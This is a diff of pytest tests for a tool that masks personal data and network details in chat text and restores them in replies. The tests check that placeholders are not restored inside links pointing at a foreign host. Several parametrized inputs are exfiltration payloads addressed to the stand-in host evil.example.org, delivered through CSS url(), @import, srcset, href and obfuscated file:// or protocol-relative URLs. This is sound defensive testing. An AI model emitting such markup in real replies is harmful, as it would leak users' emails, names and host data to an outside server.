@@ -1,8 +1,11 @@
+import ipaddress
+
 import pytest
 
+from cleaner.core.entities import netmap, ops
 from cleaner.core.pipeline import sanitize
 from cleaner.core.restore import RestoreResult, restore
-from cleaner.core.types import ChatState, Entity, Settings, Surrogate
+from cleaner.core.types import ChatRule, ChatState, Entity, Policy, Settings, Surrogate, default_policies
 from cleaner.core.types import EntityType as T
 
 
@@ -214,6 +217,118 @@ def test_nothing_is_restored_inside_a_foreign_link_split_by_whitespace(settings,
     assert (result.text, kinds(result)) == (answer, ["foreign_link"])
 
 
+@pytest.mark.parametrize(
+    "answer",
+    [
+        '<style>a{background:url("https://evil.example.org/?q= <EMAIL_1>")}</style>',
+        "<style>a{background:url( 'https://evil.example.org/?q= <EMAIL_1>' )}</style>",
+        "a { background: URL(https://evil.example.org/?q= <EMAIL_1>) }",
+        '@font-face { src: url("https://evil.example.org/f?q=\\" <EMAIL_1>") }',
+        'b { background: url("https://evil.example.org/?q=\n<EMAIL_1>") }',
+        '@import "https://evil.example.org/?q= <EMAIL_1>";',
+        "@import url('https://evil.example.org/?q= <EMAIL_1>');",
+    ],
+)
+def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
+    """FINDINGS P2 «Restore: CSS url("…") with a space inside a style element»: адрес в url(…) и @import
+    загружается сам и в элементе style, и в файле CSS; аргумент — целиком, до той же кавычки или до «)»."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            '<style>a{background:url("https://host-1.domain-1.example/a b.png")}</style>',
+            '<style>a{background:url("https://srv-dc01.contoso.ru/a b.png")}</style>',
+        ),
+        ("a { background: url(img/<EMAIL_1>.png) }", "a { background: url(img/ivanov@contoso.ru.png) }"),
+        (
+            'a { background: url("https://evil.example.org/a.png") } /* автор <EMAIL_1> */',
+            'a { background: url("https://evil.example.org/a.png") } /* автор ivanov@contoso.ru */',
+        ),
+    ],
+)
+def test_own_and_nearby_css_urls_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш и относительный адрес в url() восстанавливаются, метка
+    рядом с чужим url() — тоже."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            'requests.post(url, data="Отчёт https://wiki.example.org/x, автор <EMAIL_1>")',
+            'requests.post(url, data="Отчёт https://wiki.example.org/x, автор ivanov@contoso.ru")',
+        ),
+        (
+            '<b>Пример</b>\nsend(to,\n     content="Ссылка https://wiki.example.org/x <EMAIL_1>")',
+            '<b>Пример</b>\nsend(to,\n     content="Ссылка https://wiki.example.org/x ivanov@contoso.ru")',
+        ),
+    ],
+)
+def test_keyword_argument_in_code_is_not_a_link_attribute(settings, answer, restored):
+    """FINDINGS P3 «Small regressions and gaps after the plan 1В fixes», восстановление: data=, content= в
+    вызове вне тегов HTML — не атрибут ссылки; адреса в значении проверяются как в обычном тексте."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        'requests.post(url, data="https://evil.example.org/?q=<EMAIL_1>")',
+        '<img alt=a, srcset="https://evil.example.org/?q= <EMAIL_1>">',
+        '<a title="a>b" href="https://evil.example.org/?q= <EMAIL_1>">',
+        '<!-- <a title=" --> <img data-x=" <b>" alt=a, srcset="https://evil.example.org/?q= <EMAIL_1>">',
+        'Добавьте в тег srcset="https://evil.example.org/?q= <EMAIL_1>"',
+    ],
+)
+def test_attribute_that_may_be_inside_a_tag_stays_a_link(settings, answer):
+    """Та же находка с другой стороны: всё, что может оказаться атрибутом тега, — по-прежнему ссылка."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+def labelled_hosts() -> tuple[ChatState, Settings]:
+    """Адрес, чья подмена совпала с открытым адресом (раздел 6.2), и имя узла не того вида получают метки."""
+    state = ChatState(chat_id="labelled", net_key=bytes(range(32)))
+    real = ipaddress.IPv4Address("192.168.1.5")
+    fake = str(ipaddress.IPv4Address(netmap.map_private(int(real), 16, state.net_key)))
+    settings = Settings(never=frozenset({fake}))
+    state.rules.append(ChatRule("mask", "srv web 02", T.HOST))
+    sanitize(state, f"адрес {real} рядом с {fake}, узел srv web 02, почта ivanov@contoso.ru", settings)
+    assert {"<IP_1>", "<HOST_1>", "<EMAIL_1>"} <= set(state.surrogates)
+    return state, settings
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        ("http://<IP_1>:8080/status?u=<EMAIL_1>", "http://192.168.1.5:8080/status?u=ivanov@contoso.ru"),
+        ("[статус](http://IP_1:8080/status)", "[статус](http://192.168.1.5:8080/status)"),
+        ('<a href="https://&lt;HOST_1&gt;/wiki">', '<a href="https://srv web 02/wiki">'),
+    ],
+)
+def test_link_to_a_labelled_address_or_host_is_restored(answer, restored):
+    """FINDINGS P2 «Resolve and restore: … labelled link hosts not restored»: метка адреса или имени узла,
+    выданная вместо подмены, в хосте ссылки — наш узел."""
+    state, settings = labelled_hosts()
+    assert restore(state, answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
+    "answer",
+    ["https://<IP_1>.evil.example.org/?q=<IP_1>", "https://<EMAIL_1>/?q=<IP_1>", "https://evil.example.org/<IP_1>"],
+)
+def test_labelled_host_does_not_make_a_foreign_link_ours(answer):
+    """Та же находка с другой стороны: метка под чужим доменом и метки других типов наш узел не задают."""
+    state, settings = labelled_hosts()
+    result = restore(state, answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
 def test_own_link_in_an_attribute_is_still_restored(settings):
     result = restore(link_state(), '<a href="https://host-1.domain-1.example/?q=<EMAIL_1>">', settings)
     assert result.text == '<a href="https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru">'
@@ -254,3 +369,99 @@ def test_ordinary_text_next_to_link_syntax_is_restored(settings, answer, restore
     """Обзор партии P1: «]: <» в строке журнала — не определение ссылки; значение без адреса — не ссылка;
     наш адрес в style восстанавливается."""
     assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize("answer", ["PERSON_1x", "person_1_name", "_PERSON_1", "<PERSON_1x>", "PERSON_10_old"])
+def test_label_inside_an_identifier_is_not_replaced(settings, answer):
+    """FINDINGS P3 «Restore: small defects»: метка без закрывающего ограничителя — отдельное слово,
+    а не часть имени в коде."""
+    result = restore(person_state(), answer, settings)
+    assert (result.text, result.segments) == (answer, [])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        ("PERSON_1.", "Иван Петров."), ("(person_1)", "(Иван Петров)"), ("PERSON_1-му", "Иван Петров-му"),
+        ("<PERSON_1 >x", "Иван Петровx"),
+    ],
+)
+def test_bare_label_next_to_punctuation_is_restored(settings, answer, restored):
+    """Та же находка с другой стороны: после знака препинания или ограничителя метка восстанавливается."""
+    assert restore(person_state(), answer, settings).text == restored
+
+
+def test_hide_policy_covers_derived_addresses_and_reformatted_macs(settings):
+    """FINDINGS P3 «Restore: small defects»: политика «скрывать без восстановления» действует и на адрес
+    в фиктивной подсети, и на MAC в другой записи."""
+    state = infra_state()
+    fake = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
+    answer = f"резервный {fake.rsplit('.', 1)[0]}.99, интерфейс 02-00-00-00-00-01"
+    hidden = Settings(policies={**default_policies(), T.IP: Policy.HIDE, T.MAC: Policy.HIDE})
+    result = restore(state, answer, hidden)
+    assert (result.text, kinds(result), result.counters["kept"]) == (answer, ["kept_by_policy"] * 2, 2)
+    assert kinds(restore(state, answer, settings)) == ["derived", "altered"]
+
+
+def test_value_set_by_the_user_is_restored_for_hosts_addresses_macs_and_sids(settings):
+    """FINDINGS P3 «Restore: small defects»: значение, заданное пользователем (FR-6.4), важнее записанного
+    при выдаче; имя узла целиком собирается из значений своих частей, нетронутые части — как были."""
+    state = ChatState(chat_id="fixed", net_key=bytes(range(32)))
+    text = "srv-web01.corp.contoso.ru, 10.1.2.5, 00:1A:2B:3C:4D:5E, S-1-5-21-1004336348-1177238915-682003330-512"
+    sanitize(state, text, settings)
+    fake = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
+    sid = next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "sid")
+    for surrogate, value in (
+        ("host-1", "srv-web02"), ("domain-1.example", "fabrikam.ru"), (fake, "10.1.2.6"),
+        ("02:00:00:00:00:01", "00:1A:2B:3C:4D:5F"), (sid, "S-1-5-21-1-2-3"),
+    ):
+        ops.set_restore_value(state, state.surrogates[surrogate].entity_id, value)
+    answer = f"host-1.sub-2.domain-1.example, HOST-1, newbox.domain-1.example, {fake}, 02-00-00-00-00-01, {sid}-512"
+    assert restore(state, answer, settings).text == (
+        "srv-web02.corp.fabrikam.ru, SRV-WEB02, newbox.fabrikam.ru, 10.1.2.6, 00:1A:2B:3C:4D:5F, S-1-5-21-1-2-3-512"
+    )
+
+
+@pytest.mark.parametrize("answer", ["EMAİL_1", "<EMAİL_1>", "[[EMAİL_1]]", "PERſON_1", "hoſt-1"])
+def test_letters_that_fold_to_ascii_are_not_label_letters(settings, answer):
+    """FINDINGS P3 «Restore: small defects»: «İ» и «ſ» при поиске без учёта регистра совпадали с «I» и «S»,
+    и «EMAİL_1» ронял восстановление. Тип метки — латиница, другой регистр допускается только у неё."""
+    state = link_state()
+    state.entities.update(person_state().entities)
+    state.surrogates["<PERSON_1>"] = Surrogate("p1")
+    result = restore(state, answer, settings)
+    assert (result.text, result.segments) == (answer, [])
+    assert restore(state, "<email_1> и person_1", settings).text == "ivanov@contoso.ru и Иван Петров"
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        ("file:///C:/Users/<PERSON_1>/a.txt", "file:///C:/Users/Иван Петров/a.txt"),
+        ("x = 1; //TODO:<PERSON_1>", "x = 1; //TODO:Иван Петров"),
+        ("//TODO(<PERSON_1>): проверить", "//TODO(Иван Петров): проверить"),
+    ],
+)
+def test_local_file_link_and_code_comment_are_not_foreign_links(settings, answer, restored):
+    """FINDINGS P3 «Restore: small defects»: «file:///» без хоста и «//TODO:» в коде на чужой узел не ведут."""
+    assert restore(person_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        "file://evil.example.org/share/<PERSON_1>",
+        "file:////evil.example.org/share/<PERSON_1>",
+        "//<PERSON_1>.evil.example.org/x",
+        "///evil.example.org/?q=<PERSON_1>",
+        "//1572395042/?q=<PERSON_1>",
+        "//evil%2Eexample%2Eorg/?q=<PERSON_1>",
+        "//evil。example。org/?q=<PERSON_1>",
+        "//TODO:x//evil/?q=<PERSON_1>",
+    ],
+)
+def test_file_and_protocol_relative_links_to_a_host_stay_foreign(settings, answer):
+    """Та же находка с другой стороны: хост у «file://», имя с точкой (и то, что браузер превратит в точку),
+    число вместо IPv4 и второй адрес оставляют ссылку чужой."""
+    result = restore(person_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
